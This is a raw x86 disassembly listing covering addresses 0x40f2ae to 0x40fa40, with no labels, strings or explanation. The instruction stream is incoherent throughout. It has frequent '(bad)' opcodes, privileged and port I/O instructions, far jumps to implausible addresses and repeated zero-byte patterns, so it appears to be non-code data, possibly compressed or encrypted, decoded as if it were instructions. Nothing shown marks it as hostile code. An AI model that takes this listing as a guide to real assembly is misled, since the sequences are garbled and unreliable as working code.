  40f2ae:	lock xchg BYTE PTR [esi+0x3b8746ea],dh
  40f2b5:	mov    esi,0xb23b7ce8
  40f2ba:	xor    al,0x29
  40f2bc:	cmc    
  40f2bd:	int    0x0
  40f2bf:	add    al,0x29
  40f2c1:	in     eax,dx
  40f2c2:	push   es
  40f2c3:	xchg   DWORD PTR [ebx],ebx
  40f2c5:	mov    eax,0xb56ad7e8
  40f2ca:	add    BYTE PTR [ebx],dh
  40f2cc:	test   eax,0xdbe8c2
  40f2d1:	add    BYTE PTR [eax],al
  40f2d3:	add    BYTE PTR [eax],al
  40f2d5:	or     BYTE PTR [ebp-0x10],0x3
  40f2d9:	lea    ecx,[edi+edi*8+0x7d]
  40f2dd:	jbe    0x40f2e1
  40f2df:	test   DWORD PTR [ecx-0x174ffebe],ebp
  40f2e5:	ret    
  40f2e6:	std    
  40f2e7:	push   esi
  40f2e8:	push   ecx
  40f2e9:	sub    eax,0xa756fe8b
  40f2ee:	(bad)  
  40f2ef:	pop    es
  40f2f0:	inc    ecx
  40f2f1:	or     al,0x40
  40f2f3:	inc    BYTE PTR [esi+0x68]
  40f2f6:	inc    edx
  40f2f7:	pop    esi
  40f2f8:	lahf   
  40f2f9:	or     edi,DWORD PTR [edx]
  40f2fb:	shr    ebp,0x76
  40f2fe:	mov    bh,0x8a
  40f300:	cmp    eax,0x6af760f3
  40f305:	ret    0x52d9
  40f308:	mov    bh,0xdf
  40f30a:	fiadd  DWORD PTR [ecx]
  40f30c:	sbb    DWORD PTR [ecx-0x9],0x9aae953b
  40f313:	nop
  40f314:	jmp    0xc5846e8f
  40f319:	or     al,BYTE PTR [esi-0x3d838341]
  40f31f:	call   0x4364a2
  40f324:	push   ebx
  40f325:	inc    esi
  40f326:	dec    esp
  40f327:	adc    al,0x45
  40f329:	jecxz  0x40f337
  40f32b:	add    BYTE PTR [ecx],bh
  40f32d:	and    al,0xf6
  40f32f:	pop    edi
  40f330:	sti    
  40f331:	mov    dh,0x4c
  40f333:	out    0xaf,al
  40f335:	dec    ebx
  40f336:	dec    ebp
  40f337:	(bad)  
  40f338:	add    BYTE PTR gs:[eax],al
  40f33b:	add    BYTE PTR [eax],al
  40f33d:	add    BYTE PTR [ecx],dh
  40f33f:	cld    
  40f340:	and    DWORD PTR [ecx],0x76
  40f343:	add    al,BYTE PTR [eax]
  40f345:	rcr    BYTE PTR [ebx+eax*1+0x0],0xe9
  40f34a:	and    DWORD PTR [ecx-0x4ee406dd],edi
  40f350:	and    edi,ebp
  40f352:	mov    cs:0x7a248ec7,al
  40f358:	inc    ebx
  40f359:	add    BYTE PTR [eax-0x4077eb4],dh
  40f35f:	add    al,BYTE PTR [esp+eiz*4-0x7cffffa4]
  40f366:	jo     0x40f382
  40f368:	and    BYTE PTR [eax],al
  40f36a:	inc    esi
  40f36b:	nop
  40f36c:	mov    eax,DWORD PTR [eax+esi*2-0x12]
  40f370:	imul   eax,DWORD PTR [eax],0x8c1aa80c
  40f376:	pop    esi
  40f377:	add    BYTE PTR [ebx-0x7cd98f84],cl
  40f37d:	les    ecx,FWORD PTR [eax-0x79]
  40f380:	jp     0x40f3a6
  40f382:	sbb    BYTE PTR [esi*2-0x116a486],al
  40f389:	adc    eax,0x3e5488
  40f38e:	(bad)  
  40f38f:	mov    esi,0xcef9751e
  40f394:	xor    eax,0x2423e88d
  40f399:	xor    dl,BYTE PTR [edi-0x34]
  40f39c:	add    al,0x8d
  40f39e:	fmul   QWORD PTR [edi]
  40f3a0:	jg     0x40f39c
  40f3a2:	add    BYTE PTR [eax],al
  40f3a4:	add    BYTE PTR [eax],al
  40f3a6:	add    ch,dl
  40f3a8:	sub    al,BYTE PTR [edx]
  40f3aa:	mov    bl,BYTE PTR [esi-0x6372eb53]
  40f3b0:	jno    0x40f430
  40f3b2:	cli    
  40f3b3:	shr    DWORD PTR [edx],1
  40f3b5:	add    al,BYTE PTR [edx*1-0x7372f751]
  40f3bc:	sar    DWORD PTR [esi-0x6],1
  40f3bf:	shr    DWORD PTR [edx],1
  40f3c1:	adc    eax,0xd983e504
  40f3c6:	je     0x40f36b
  40f3c8:	inc    edi
  40f3c9:	inc    DWORD PTR [eax-0x52]
  40f3cc:	push   ds
  40f3cd:	jmp    0x8d88:0x2dfcc07
  40f3d4:	jbe    0x40f3d5
  40f3d6:	inc    ebp
  40f3d7:	jne    0x40f359
  40f3d9:	inc    edi
  40f3da:	xor    DWORD PTR [ebp-0x617be40a],0x4e
  40f3e1:	es (bad) 
  40f3e3:	xor    DWORD PTR [ebp+0x22],eax
  40f3e6:	add    DWORD PTR [ebp+0x59],esi
  40f3e9:	add    bh,bh
  40f3eb:	loop   0x40f44e
  40f3ed:	jnp    0x40f465
  40f3ef:	jno    0x40f3d5
  40f3f1:	xlat   BYTE PTR ds:[ebx]
  40f3f2:	add    ebp,eax
  40f3f4:	mov    WORD PTR [esi],fs
  40f3f6:	cmp    al,0x5d
  40f3f8:	xor    al,0x4a
  40f3fa:	dec    BYTE PTR [edx-0x52]
  40f3fd:	(bad)  
  40f3fe:	and    edx,DWORD PTR [ebp+0x38c85a69]
  40f404:	or     al,0x50
  40f406:	mov    bh,BYTE PTR [ecx+0xe7fffd]
  40f40c:	add    BYTE PTR [eax],al
  40f40e:	add    BYTE PTR [eax],al
  40f410:	mov    esi,0xf0fe4fd2
  40f415:	pushf  
  40f416:	es adc ch,al
  40f419:	icebp  
  40f41a:	mov    al,ds:0x855974c0
  40f41f:	mov    edi,0xff12e67a
  40f424:	add    al,BYTE PTR [esi+edi*2]
  40f427:	inc    ebx
  40f428:	push   ecx
  40f429:	popa   
  40f42a:	mov    dl,0xe7
  40f42c:	dec    esi
  40f42d:	or     al,BYTE PTR [edx]
  40f42f:	add    dh,bh
  40f431:	lock test edx,ebx
  40f434:	imul   ebx,DWORD PTR [ebx+edi*2],0x8901917b
  40f43b:	dec    BYTE PTR [ecx-0xe]
  40f43e:	jp     0x40f432
  40f440:	test   ah,0x27
  40f443:	and    BYTE PTR [ebp-0x51],dh
  40f446:	mov    bl,0x8c
  40f448:	xor    DWORD PTR ds:0xe9756a1c,eax
  40f44e:	pop    ebx
  40f44f:	dec    ebx
  40f450:	(bad)  
  40f451:	push   esi
  40f452:	add    al,BYTE PTR [ebx-0x260afe47]
  40f458:	pop    esp
  40f459:	jge    0x40f47f
  40f45b:	sub    BYTE PTR [ebp-0x4c],cl
  40f45e:	cmp    BYTE PTR [edi+0x61],cl
  40f461:	push   cs
  40f462:	test   ebx,0xac7f82
  40f468:	call   0xc564b932
  40f46d:	pop    edx
  40f46e:	or     DWORD PTR [ecx+0x6b],edx
  40f471:	dec    edx
  40f472:	imul   eax,DWORD PTR [esi+0x0],0x0
  40f479:	pushf  
  40f47a:	mov    ecx,0x5ac73cdb
  40f47f:	mov    WORD PTR es:[ebx+0x4a],ss
  40f483:	rcl    BYTE PTR [ebx],0xc0
  40f486:	add    ch,cl
  40f488:	dec    esi
  40f489:	mov    DWORD PTR [esi],ecx
  40f48b:	sbb    eax,0xd3493ac3
  40f490:	and    eax,DWORD PTR [esi+0x7710e8c2]
  40f496:	add    ebp,ecx
  40f498:	add    esi,DWORD PTR [edx+0x7e]
  40f49b:	mov    eax,ds:0x1d4a1b4e
  40f4a0:	fcom   DWORD PTR [esi-0x1a]
  40f4a3:	add    BYTE PTR [edx+0x130d4a35],cl
  40f4a9:	xor    eax,0xefaaa6aa
  40f4ae:	pop    edi
  40f4af:	fwait
  40f4b0:	inc    ecx
  40f4b1:	jbe    0x40f4b5
  40f4b3:	pushf  
  40f4b4:	jp     0x40f494
  40f4b6:	test   esp,edi
  40f4b8:	mov    DWORD PTR [edi-0x50],0xf6614f3d
  40f4bf:	imul   esi,DWORD PTR [eax-0x3a4b5f2],0xffffffff
  40f4c6:	push   edx
  40f4c7:	ror    BYTE PTR [ecx-0x7d3ab635],0x51
  40f4ce:	dec    edx
  40f4cf:	call   0xff872e54
  40f4d4:	sbb    BYTE PTR [ecx-0x6f],cl
  40f4d7:	scas   eax,DWORD PTR es:[edi]
  40f4d8:	call   0x71187253
  40f4dd:	add    BYTE PTR [eax],al
  40f4df:	add    BYTE PTR [eax],al
  40f4e1:	add    ch,ah
  40f4e3:	add    DWORD PTR [ebp-0x7317523e],eax
  40f4e9:	sub    al,0xe5
  40f4eb:	mov    ecx,0x61b6a932
  40f4f0:	loop   0x40f52b
  40f4f2:	jno    0x40f4f6
  40f4f4:	mov    ah,BYTE PTR [ecx-0x7e08320b]
  40f4fa:	xchg   DWORD PTR [edx-0x58ec1700],ebx
  40f500:	mov    DWORD PTR [edx],ebp
  40f502:	(bad)  
  40f505:	icebp  
  40f506:	jbe    0x40f585
  40f508:	je     0x40f55f
  40f50a:	neg    ebp
  40f50c:	or     ebp,ecx
  40f50e:	in     eax,dx
  40f50f:	dec    esi
  40f510:	jae    0x40f50d
  40f512:	cmc    
  40f513:	retf   
  40f514:	xor    eax,0x4f893d6c
  40f519:	xor    esi,DWORD PTR fs:[edi]
  40f51c:	dec    edi
  40f51d:	inc    ecx
  40f51e:	lea    esp,[edi+edi*8+0x7488ede8]
  40f525:	cli    
  40f526:	sbb    BYTE PTR [esi+eax*1-0x71],bh
  40f52a:	jg     0x40f4eb
  40f52c:	icebp  
  40f52d:	xchg   esp,eax
  40f52e:	cld    
  40f52f:	fimul  WORD PTR [edx+0x3ae074ae]
  40f535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f536:	dec    edx
  40f537:	aad    0x4c
  40f539:	div    BYTE PTR [edx+0x6c2682fc]
  40f53f:	or     esi,DWORD PTR [ebp-0xb]
  40f542:	les    esi,FWORD PTR [ecx]
  40f544:	push   0xffffffd7
  40f546:	add    BYTE PTR [eax],al
  40f548:	add    BYTE PTR [eax],al
  40f54a:	add    BYTE PTR [edi+0x77],bh
  40f54d:	inc    esp
  40f54e:	xchg   ebp,eax
  40f54f:	add    ebx,ebx
  40f551:	cmp    DWORD PTR [edx],esi
  40f553:	inc    edx
  40f554:	(bad)  
  40f555:	sti    
  40f556:	add    BYTE PTR [ecx+0x41],al
  40f559:	push   es
  40f55a:	(bad)  
  40f55b:	pop    ecx
  40f55c:	inc    edi
  40f55d:	dec    BYTE PTR [eax-0x7a194d97]
  40f563:	and    al,0xb7
  40f565:	std    
  40f566:	test   esp,ecx
  40f568:	sub    DWORD PTR [eax],edx
  40f56a:	mov    ebx,DWORD PTR [ecx-0x4e]
  40f56d:	xor    edx,edx
  40f56f:	jmp    0x40f523
  40f571:	std    
  40f572:	jne    0x40f508
  40f574:	lods   al,BYTE PTR ds:[esi]
  40f575:	bound  esi,QWORD PTR [eax+0x4588048d]
  40f57b:	arpl   WORD PTR [edi+0x13f40873],si
  40f581:	mov    dh,0xff
  40f583:	ror    esp,cl
  40f585:	pop    ebx
  40f586:	pextrw ebp,(bad),0xc5
  40f588:	cs std 
  40f58a:	push   DWORD PTR [ebx-0x143c196f]
  40f590:	mov    ch,0xfd
  40f592:	xor    al,BYTE PTR [edi-0x4c009e55]
  40f598:	mov    ch,0x54
  40f59a:	mov    ebp,DWORD PTR [ebp+0x7f]
  40f59d:	hlt    
  40f59e:	sets   BYTE PTR [esi+edi*8+0x14ca0cff]
  40f5a6:	test   BYTE PTR [esi+0x2a],bl
  40f5a9:	jp     0x40f602
  40f5ab:	das    
  40f5ac:	or     eax,0xff32
  40f5b1:	add    BYTE PTR [eax],al
  40f5b3:	add    BYTE PTR [esp+edi*4-0x36008ad2],bl
  40f5ba:	push   esp
  40f5bb:	add    DWORD PTR [esp+edi*4-0x7c268b8a],ecx
  40f5c2:	clc    
  40f5c3:	pop    eax
  40f5c4:	imul   edi,ebp,0xc04f0469
  40f5ca:	add    BYTE PTR [edi-0x61],bl
  40f5cd:	int3   
  40f5ce:	adc    al,0x8d
  40f5d0:	ss push cs
  40f5d2:	jg     0x40f5cf
  40f5d4:	jne    0x40f638
  40f5d6:	ror    DWORD PTR [edi],cl
  40f5d8:	pop    ebx
  40f5d9:	sub    BYTE PTR [ecx+edx*8+0x66063ab4],cl
  40f5e0:	jbe    0x40f575
  40f5e2:	in     al,0x82
  40f5e4:	pushf  
  40f5e5:	dec    ecx
  40f5e6:	push   edi
  40f5e7:	sub    eax,0x7f8cf3f0
  40f5ec:	sahf   
  40f5ed:	push   esi
  40f5ee:	ror    DWORD PTR [edi],cl
  40f5f0:	sbb    ebx,DWORD PTR [eax-0x74]
  40f5f3:	shl    DWORD PTR [edx+edi*2-0x5c8999fa],1
  40f5fa:	in     al,0x82
  40f5fc:	mov    WORD PTR [eax+0x23001557],cs
  40f602:	ins    DWORD PTR es:[edi],dx
  40f603:	jg     0x40f673
  40f605:	push   esi
  40f606:	rcl    DWORD PTR [ebx],cl
  40f608:	fld    TBYTE PTR [eax]
  40f60a:	mov    ecx,ss
  40f60c:	xor    al,0xba
  40f60e:	push   es
  40f60f:	data16 jbe 0x40f625
  40f612:	in     eax,0x82
  40f614:	pop    esp
  40f615:	mov    bl,bh
  40f617:	mov    dh,0x0
  40f619:	add    BYTE PTR [eax],al
  40f61b:	add    BYTE PTR [eax],al
  40f61d:	sub    al,0x9f
  40f61f:	push   edi
  40f620:	mov    cl,0x9e
  40f622:	aad    0x30
  40f624:	jae    0x40f69c
  40f626:	fdivr  QWORD PTR [ebx]
  40f628:	add    BYTE PTR [ebx+0x3a8afae2],dl
  40f62e:	js     0x40f5dc
  40f630:	ret    0x1266
  40f633:	fld    DWORD PTR [edi]
  40f635:	fwait
  40f636:	sar    dl,cl
  40f638:	push   edi
  40f639:	stos   DWORD PTR es:[edi],eax
  40f63a:	sbb    al,0x86
  40f63c:	ror    DWORD PTR [ecx-0xef68773],1
  40f642:	adc    edi,edx
  40f644:	dec    ebp
  40f645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f646:	sbb    DWORD PTR [ebx+0x5c698f8],eax
  40f64c:	push   0x77
  40f64e:	jno    0x40f6a7
  40f650:	add    al,0xf5
  40f652:	add    eax,esp
  40f654:	pop    ds
  40f655:	dec    eax
  40f656:	add    DWORD PTR [ebx],ebp
  40f658:	mov    dl,0x87
  40f65a:	push   eax
  40f65b:	shl    ebx,0x42
  40f65e:	dec    ecx
  40f65f:	bswap  ebx
  40f661:	pop    ebp
  40f662:	fstp   TBYTE PTR [esi+0x7ef718fe]
  40f668:	cmp    eax,0xe2b80310
  40f66d:	not    DWORD PTR [edi-0x8]
  40f670:	cli    
  40f671:	jecxz  0x40f6c2
  40f673:	sub    bh,BYTE PTR [esi+0x7c]
  40f676:	sbb    BYTE PTR [edi+0x6c640814],0x3d
  40f67d:	push   es
  40f67e:	add    ebp,DWORD PTR [edx+0x3c]
  40f681:	add    BYTE PTR [eax],al
  40f683:	add    BYTE PTR [eax],al
  40f685:	add    BYTE PTR [ebp-0x9],dh
  40f688:	cmp    eax,0xf5011a3a
  40f68d:	add    esp,ebx
  40f68f:	cmp    esi,DWORD PTR [ebp+0x4b]
  40f692:	bound  eax,QWORD PTR [esi+0x6]
  40f695:	jge    0x40f702
  40f697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f698:	sub    DWORD PTR [edi],edx
  40f69a:	xor    eax,0xfde1f0d9
  40f69f:	std    
  40f6a0:	mov    al,0x46
  40f6a2:	test   eax,0x4e873c79
  40f6a7:	mov    bl,0x99
  40f6a9:	mov    cl,0xcb
  40f6ab:	adc    DWORD PTR [edx],esp
  40f6ad:	fcom   QWORD PTR [esi]
  40f6af:	leave  
  40f6b0:	test   al,0x3
  40f6b2:	in     al,dx
  40f6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6b4:	inc    eax
  40f6b5:	dec    ebx
  40f6b6:	xor    DWORD PTR [edx+0x7b12c3fa],0x414f2fa3
  40f6c0:	in     eax,0x7f
  40f6c2:	mov    eax,DWORD PTR [ebx]
  40f6c4:	jmp    0x829383cc
  40f6c9:	ret    
  40f6ca:	repnz mov ch,0xfd
  40f6cd:	lock sub dh,cl
  40f6d0:	jmp    FWORD PTR [eax+0x25443d76]
  40f6d6:	jo     0x40f6da
  40f6d8:	add    cl,ch
  40f6da:	push   ecx
  40f6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6dc:	(bad)  
  40f6dd:	jo     0x40f6fc
  40f6df:	cmp    cl,BYTE PTR [eax-0x3cf776cc]
  40f6e5:	fidivr WORD PTR [edx]
  40f6e7:	mov    ebx,0xe900
  40f6ec:	add    BYTE PTR [eax],al
  40f6ee:	add    BYTE PTR [esi-0x4f],dh
  40f6f1:	mov    WORD PTR [esi*1+0x51248cb2],gs
  40f6f8:	mov    dl,0xfe
  40f6fa:	cdq    
  40f6fb:	cmc    
  40f6fc:	test   DWORD PTR [esi],ecx
  40f6fe:	ins    BYTE PTR es:[edi],dx
  40f6ff:	add    eax,DWORD PTR [bx+si]
  40f702:	jmp    0x193a7ca
  40f707:	jns    0x40f6d7
  40f709:	aas    
  40f70a:	jmp    0xd9f8e53e
  40f70f:	ss inc ebp
  40f711:	mov    DWORD PTR [ecx-0x4d203917],eax
  40f717:	mov    bl,0xf4
  40f719:	sub    ecx,0x71
  40f71c:	add    al,BYTE PTR [eax]
  40f71e:	mov    esi,0xf9e3eebf
  40f723:	ss inc ebp
  40f725:	xchg   DWORD PTR [esi+ebp*4-0x45213cf8],ebp
  40f72c:	pop    esp
  40f72d:	(bad)  
  40f72e:	call   0x6980d1a9
  40f733:	jbe    0x40f737
  40f735:	push   ebx
  40f736:	call   0x452f:0xe9680340
  40f73d:	(bad)  
  40f73e:	mov    edx,0xf443eebf
  40f743:	ss inc ebp
  40f745:	xchg   DWORD PTR [edx+esi*4+0x5695c308],ebp
  40f74c:	ja     0x40f79a
  40f74e:	add    BYTE PTR [esi+ecx*4+0xff4e],ch
  40f755:	add    BYTE PTR [eax],al
  40f757:	add    cl,al
  40f759:	jo     0x40f76d
  40f75b:	inc    eax
  40f75c:	int3   
  40f75d:	cmp    DWORD PTR [esi+0x43c9ba74],0x13bb8ccc
  40f767:	lods   al,BYTE PTR ds:[esi]
  40f768:	rol    BYTE PTR [eax-0x2],0x84
  40f76c:	or     al,0x35
  40f76e:	add    DWORD PTR [ecx+0x3589b289],ecx
  40f774:	sub    al,0x4e
  40f776:	add    BYTE PTR ds:[esi+0x46],al
  40f77a:	push   ebp
  40f77b:	inc    DWORD PTR [edx]
  40f77d:	and    al,0x8
  40f77f:	push   edi
  40f780:	adc    eax,0xd2ffee85
  40f785:	(bad)  
  40f786:	std    
  40f787:	jne    0x40f775
  40f789:	enter  0xe443,0x43
  40f78d:	mov    ebx,0x407ce013
  40f792:	dec    BYTE PTR [eax-0x3cc6555f]
  40f798:	pusha  
  40f799:	mov    DWORD PTR ss:0x3e4f04,esi
  40f7a0:	jl     0x40f75b
  40f7a2:	jae    0x40f79c
  40f7a4:	fist   DWORD PTR [eax]
  40f7a6:	mov    BYTE PTR [ebp-0x78],al
  40f7a9:	cmc    
  40f7aa:	ret    0xa74
  40f7ad:	sub    BYTE PTR [esi],bl
  40f7af:	add    BYTE PTR [eax+0x3e],bl
  40f7b2:	push   ecx
  40f7b3:	push   ebx
  40f7b4:	adc    edi,DWORD PTR [ebx+0x336be473]
  40f7ba:	out    dx,al
  40f7bb:	push   ebx
  40f7bc:	add    BYTE PTR [eax],al
  40f7be:	add    BYTE PTR [eax],al
  40f7c0:	add    bh,bh
  40f7c2:	mov    edx,0x534bf873
  40f7c7:	into   
  40f7c8:	adc    ah,bl
  40f7ca:	inc    DWORD PTR [eax+eax*8+0x5d38f8e0]
  40f7d1:	jne    0x40f7b8
  40f7d3:	iret   
  40f7d4:	pop    ds
  40f7d5:	out    dx,al
  40f7d6:	data16 sub al,BYTE PTR ss:[eax+0x5]
  40f7db:	jge    0x40f821
  40f7dd:	lds    eax,FWORD PTR [ebp+ecx*8-0xd]
  40f7e1:	jb     0x40f784
  40f7e3:	cmp    ebp,DWORD PTR [edx]
  40f7e5:	xor    BYTE PTR [ecx],dl
  40f7e7:	stc    
  40f7e8:	inc    edi
  40f7e9:	mov    dh,0x9
  40f7eb:	mov    bl,0xfe
  40f7ed:	inc    eax
  40f7ee:	popa   
  40f7ef:	inc    edi
  40f7f0:	adc    al,0x9
  40f7f2:	inc    esi
  40f7f3:	ret    0xbbff
  40f7f6:	scas   al,BYTE PTR es:[edi]
  40f7f7:	sti    
  40f7f8:	mov    WORD PTR [eax],?
  40f7fa:	gs inc edi
  40f7fc:	je     0x40f797
  40f7fe:	xor    DWORD PTR [ebp+0x42],edx
  40f801:	je     0x40f85c
  40f803:	jnp    0x40f881
  40f805:	xchg   ebp,eax
  40f806:	loop   0x40f7c5
  40f808:	out    0x92,eax
  40f80a:	out    0x27,al
  40f80c:	inc    BYTE PTR [eax]
  40f80e:	mov    eax,ds:0xe682d547
  40f813:	push   edi
  40f814:	(bad)  
  40f815:	pusha  
  40f816:	mov    ch,0xf2
  40f818:	aas    
  40f819:	jne    0x40f897
  40f81b:	int    0xf7
  40f81d:	push   0x2e
  40f81f:	lgs    ebx,FWORD PTR cs:[ecx-0x51]
  40f824:	inc    BYTE PTR [eax]
  40f826:	add    BYTE PTR [eax],al
  40f828:	add    BYTE PTR [eax],al
  40f82a:	sub    BYTE PTR [ebp-0xe],0x3f
  40f82e:	jne    0x40f852
  40f830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f831:	rol    ecx,cl
  40f833:	stc    
  40f834:	(bad)  
  40f836:	mov    edi,0xc0ff0299
  40f83b:	or     eax,0x27351448
  40f840:	ret    0x6fff
  40f843:	sbb    bh,cl
  40f845:	add    al,0x22
  40f847:	xchg   BYTE PTR [edx],ch
  40f849:	inc    BYTE PTR [ebp+0x14]
  40f84c:	into   
  40f84d:	rcl    DWORD PTR [edx],cl
  40f84f:	add    bh,ah
  40f851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f852:	fs ret 0x7ce8
  40f856:	mov    ecx,0x9fa9b55a
  40f85b:	cmp    DWORD PTR [edx],ebp
  40f85d:	push   edx
  40f85f:	fdiv   st,st(4)
  40f861:	(bad)  [edx]
  40f863:	iret   
  40f864:	test   eax,0x6178cd03
  40f869:	add    eax,0x21f70f75
  40f86e:	dec    eax
  40f86f:	inc    esi
  40f870:	jno    0x40f834
  40f872:	mov    ?,edi
  40f874:	stos   BYTE PTR es:[edi],al
  40f875:	test   DWORD PTR [ebx],0x2e78fcba
  40f87b:	add    ecx,esi
  40f87d:	imul   bl
  40f87f:	shr    esi,0xdd
  40f882:	icebp  
  40f883:	inc    ecx
  40f884:	xor    al,0x23
  40f886:	lldt   WORD PTR [esi]
  40f889:	ficomp WORD PTR [edi+0x4a]
  40f88c:	cmp    ebx,ebp
  40f88e:	add    BYTE PTR [eax],al
  40f890:	add    BYTE PTR [eax],al
  40f892:	add    bh,bh
  40f894:	rol    BYTE PTR [ebx+eax*1-0x79],1
  40f898:	js     0x40f8ad
  40f89a:	pusha  
  40f89b:	adc    eax,0x30
  40f89e:	scas   al,BYTE PTR es:[edi]
  40f89f:	jnp    0x40f88d
  40f8a1:	xor    dl,dh
  40f8a3:	mov    dl,0x2
  40f8a5:	ins    BYTE PTR es:[edi],dx
  40f8a6:	inc    esp
  40f8a7:	out    0x7,al
  40f8a9:	mov    edx,0x8cb7ed4d
  40f8ae:	sub    DWORD PTR [ecx+0x387b6d3e],0x2e
  40f8b5:	repz adc dh,BYTE PTR ds:0xd97b29c3
  40f8bc:	sub    ch,BYTE PTR [ecx-0x47]
  40f8bf:	ds inc edx
  40f8c1:	sbb    DWORD PTR [edx+ebx*1-0x51],eax
  40f8c5:	jno    0x40f8c9
  40f8c7:	jne    0x40f90e
  40f8c9:	shl    bl,cl
  40f8cb:	call   0xe642:0x37b9fffa
  40f8d2:	add    eax,0x7200038e
  40f8d7:	xor    al,0x12
  40f8d9:	mov    ebx,DWORD PTR [ebx]
  40f8db:	jle    0x40f89b
  40f8dd:	pop    es
  40f8de:	push   0x14
  40f8e0:	notrack jmp DWORD PTR [ecx+0x28]
  40f8e4:	inc    BYTE PTR [edx-0x9a10bb]
  40f8ea:	call   0x6d4ffb65
  40f8ef:	push   ebx
  40f8f0:	inc    ecx
  40f8f1:	(bad)  
  40f8f2:	jmp    0x894a9646
  40f8f7:	add    BYTE PTR [eax],al
  40f8f9:	add    BYTE PTR [eax],al
  40f8fb:	add    BYTE PTR [esi+0x2],dh
  40f8fe:	add    BYTE PTR [eax+0xd],dh
  40f901:	adc    al,BYTE PTR [ebp-0x747a3c4e]
  40f907:	jmp    0x24cbfb82
  40f90c:	lods   eax,DWORD PTR ds:[esi]
  40f90d:	add    al,0xd9
  40f90f:	jo     0x40f8de
  40f911:	or     DWORD PTR [ebp-0x28c68e2b],ecx
  40f917:	shl    BYTE PTR [esi],cl
  40f919:	in     al,0xc2
  40f91b:	jb     0x40f8f7
  40f91d:	or     esi,DWORD PTR [edx+edx*8]
  40f920:	and    al,0xec
  40f922:	stc    
  40f923:	pusha  
  40f924:	lods   eax,DWORD PTR ds:[esi]
  40f925:	or     eax,0x4692c8b
  40f92a:	fnstenv [eax+0x1d]
  40f92d:	popa   
  40f92e:	add    dl,0x76
  40f931:	mov    dh,0x53
  40f933:	bound  esp,QWORD PTR [edi]
  40f935:	add    eax,0xb34e7383
  40f93a:	inc    esi
  40f93b:	je     0x40f979
  40f93d:	cmp    eax,edx
  40f93f:	dec    esi
  40f940:	sar    DWORD PTR [esi+0x25556a0f],0xff
  40f947:	popa   
  40f948:	in     eax,0x24
  40f94a:	cmp    al,BYTE PTR [eax]
  40f94c:	mov    edx,DWORD PTR [edx+esi*1+0xf]
  40f950:	stos   DWORD PTR es:[edi],eax
  40f951:	jno    0x40f9a4
  40f953:	or     BYTE PTR [edx],ch
  40f955:	adc    al,0x74
  40f958:	jns    0x40f8e1
  40f95a:	loopne 0x40f95b
  40f95c:	add    eax,DWORD PTR ds:0x300
  40f962:	add    BYTE PTR [eax],al
  40f964:	add    bh,bh
  40f966:	add    edx,ecx
  40f968:	cmp    edi,DWORD PTR [ecx+0x5916703c]
  40f96e:	lds    esi,FWORD PTR [edx+0x4]
  40f971:	mov    bh,0xf4
  40f973:	jne    0x40f983
  40f975:	addr16 dec edx
  40f977:	or     ch,BYTE PTR [ecx]
  40f979:	es mov esp,0xbce20338
  40f97f:	cmp    BYTE PTR [ebx+0x45fd3651],cl
  40f985:	mov    eax,0x8703c3da
  40f98a:	add    ch,bl
  40f98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f98d:	pop    ds
  40f98e:	jns    0x40f98a
  40f990:	jmp    FWORD PTR [eax*1-0x3b60f215]
  40f997:	ds ret 
  40f999:	pop    ss
  40f99a:	popa   
  40f99b:	out    0x83,al
  40f99d:	jno    0x40f969
  40f99f:	std    
  40f9a0:	xor    bl,ah
  40f9a2:	fst    QWORD PTR [edi-0x3dfb7176]
  40f9a8:	or     al,0x8c
  40f9aa:	pop    edx
  40f9ab:	adc    ch,BYTE PTR [eax+0x74]
  40f9ae:	push   ecx
  40f9af:	inc    ecx
  40f9b0:	add    BYTE PTR [esi+esi*2],al
  40f9b3:	mov    BYTE PTR [edx],al
  40f9b5:	dec    esp
  40f9b6:	mov    ebx,0xbc0733ef
  40f9bb:	pop    ebx
  40f9bc:	cld    
  40f9bd:	xlat   BYTE PTR ds:[ebx]
  40f9be:	cmp    BYTE PTR [edx],0x8b
  40f9c1:	push   eax
  40f9c2:	adc    al,0x50
  40f9c4:	mov    BYTE PTR [ecx],al
  40f9c6:	fild   QWORD PTR [eax+0x40]
  40f9c9:	add    BYTE PTR [eax],al
  40f9cb:	add    BYTE PTR [eax],al
  40f9cd:	add    BYTE PTR [ebp+0x41],dh
  40f9d0:	add    dh,BYTE PTR [eax]
  40f9d2:	jne    0x40f9fd
  40f9d4:	stos   DWORD PTR es:[edi],eax
  40f9d5:	push   edx
  40f9d6:	sub    bh,BYTE PTR [edi-0x6]
  40f9d9:	dec    BYTE PTR [eax+0x753ff095]
  40f9df:	mov    ds:0xec4edfbe,al
  40f9e4:	iret   
  40f9e5:	pop    edx
  40f9e6:	mov    ds:0xc9155a7f,al
  40f9eb:	and    BYTE PTR [ebp-0x76],al
  40f9ee:	sub    eax,0xaedbb6a3
  40f9f3:	in     al,0xcf
  40f9f5:	xor    BYTE PTR [esi-0x64],al
  40f9f8:	lods   al,BYTE PTR ds:[esi]
  40f9f9:	mov    cl,BYTE PTR [eax+0x9]
  40f9fc:	pop    esp
  40f9fd:	(bad)  
  40f9ff:	cmp    BYTE PTR [ebx-0x7d],al
  40fa02:	mov    ch,0xb5
  40fa04:	call   0xcd691c5b
  40fa09:	fcmovnb st,st(2)
  40fa0b:	(bad)  
  40fa0c:	arpl   si,di
  40fa0e:	inc    eax
  40fa0f:	and    DWORD PTR [ebx+0x14],eax
  40fa12:	inc    ecx
  40fa13:	cmp    eax,edx
  40fa15:	jmp    DWORD PTR [ebx-0x5540189f]
  40fa1b:	popa   
  40fa1c:	jp     0x40fa62
  40fa1e:	xchg   edx,eax
  40fa1f:	js     0x40f9ee
  40fa21:	fistp  DWORD PTR [ebp-0x75016f01]
  40fa27:	and    DWORD PTR [ebp-0x25c9f71a],esp
  40fa2d:	(bad)  
  40fa2e:	cli    
  40fa2f:	sub    BYTE PTR [edx],al
  40fa31:	push   ebx
  40fa32:	add    BYTE PTR [eax],al
  40fa34:	add    BYTE PTR [eax],al
  40fa36:	add    BYTE PTR [edx+0x16],dh
  40fa39:	fs (bad) 
  40fa3b:	loopne 0x40fa6e
  40fa3d:	inc    ebx
  40fa3e:	adc    al,0x29
  40fa40:	pop    ebx
